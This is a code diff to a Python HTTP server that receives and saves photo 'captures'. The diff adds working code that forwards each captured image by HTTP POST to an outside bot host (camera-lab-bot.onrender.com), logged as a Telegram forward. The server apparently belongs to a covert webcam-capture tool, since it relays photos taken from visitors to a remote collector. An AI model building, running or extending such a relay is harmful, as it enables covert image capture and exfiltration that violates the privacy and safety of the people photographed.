@@ -1,6 +1,8 @@
 import re
 import time
 import os
+import urllib.request
+import urllib.error
 from pathlib import Path
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
@@ -68,6 +70,40 @@ class Handler(BaseHTTPRequestHandler):
         filename.write_bytes(photo)
 
         print(f"[+] Capture received: {len(photo)} bytes -> {filename.name}")
+
+        boundary_out = b"----CameraLabForwardBoundary"
+        body = (
+            b"--" + boundary_out + b"\r\n"
+            b'Content-Disposition: form-data; name="photo"; filename="' +
+            filename.name.encode() + b'"\r\n'
+            b"Content-Type: image/jpeg\r\n\r\n" +
+            photo +
+            b"\r\n--" + boundary_out + b"--\r\n"
+        )
+
+        req = urllib.request.Request(
+            "https://camera-lab-bot.onrender.com/photo",
+            data=body,
+            method="POST",
+            headers={
+                "Content-Type": (
+                    "multipart/form-data; boundary=" +
+                    boundary_out.decode()
+                ),
+                "Content-Length": str(len(body)),
+            },
+        )
+
+        try:
+            with urllib.request.urlopen(req, timeout=30) as response:
+                result = response.read().decode("utf-8", "replace")
+                print(f"[+] Telegram forward: HTTP {response.status} -> {result}")
+        except urllib.error.HTTPError as exc:
+            error = exc.read().decode("utf-8", "replace")
+            print(f"[!] Telegram forward failed: HTTP {exc.code} -> {error}")
+        except urllib.error.URLError as exc:
+            print(f"[!] Telegram forward connection failed: {exc}")
+
 
         self.send_response(200)
         self.send_header("Content-Type", "text/plain")
